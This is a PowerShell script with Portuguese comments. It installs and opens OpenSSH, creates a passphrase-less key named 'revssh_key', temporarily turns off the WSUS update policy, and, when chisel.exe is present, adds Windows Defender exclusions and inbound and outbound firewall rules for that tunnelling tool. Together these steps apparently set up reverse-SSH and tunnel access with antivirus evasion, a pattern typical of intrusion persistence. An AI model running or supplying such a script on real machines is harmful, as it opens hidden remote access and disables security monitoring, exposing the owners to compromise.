# Executar como Administrador
$KeyPath = "C:\Windows\System32\OpenSSH\revssh_key"
$ChiselPath = "C:\tools\chisel.exe"
$regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU"

# --- Desativar WSUS temporariamente ---
if (Test-Path $regPath) {
    $orig = (Get-ItemProperty -Path $regPath -Name UseWUServer -ErrorAction SilentlyContinue).UseWUServer
    if ($orig -eq 1) {
        Set-ItemProperty -Path $regPath -Name UseWUServer -Value 0 -Force
        Stop-Service wuauserv -Force
        Start-Service wuauserv
    }
}

# --- Instalar OpenSSH (Client e Server) ---
$features = "OpenSSH.Client~0.0.1.0","OpenSSH.Server~0.0.1.0"
foreach ($f in $features) {
    if ((Get-WindowsCapability -Online -Name $f).State -ne "Installed") {
        Add-WindowsCapability -Online -Name $f
    }
}

# --- Firewall para SSH ---
if (-not (Get-NetFirewallRule -Name "sshd" -ErrorAction SilentlyContinue)) {
    New-NetFirewallRule -Name sshd -DisplayName "OpenSSH Server" -Direction Inbound `
        -Protocol TCP -LocalPort 22 -Action Allow
}

# --- Iniciar SSH ---
Set-Service -Name sshd -StartupType Automatic
Start-Service sshd

# --- Gerar chave se não existir ---
if (-not (Test-Path $KeyPath)) {
    ssh-keygen -t ed25519 -f $KeyPath -N "" | Out-Null
}

# --- Configurar regras para Chisel apenas se existir ---
if (Test-Path $ChiselPath) {
    Add-MpPreference -ExclusionPath (Split-Path $ChiselPath)
    Add-MpPreference -ExclusionProcess $ChiselPath

    if (-not (Get-NetFirewallRule -DisplayName "Allow Chisel Inbound" -ErrorAction SilentlyContinue)) {
        New-NetFirewallRule -DisplayName "Allow Chisel Inbound" -Direction Inbound -Program $ChiselPath -Action Allow
    }
    if (-not (Get-NetFirewallRule -DisplayName "Allow Chisel Outbound" -ErrorAction SilentlyContinue)) {
        New-NetFirewallRule -DisplayName "Allow Chisel Outbound" -Direction Outbound -Program $ChiselPath -Action Allow
    }
}
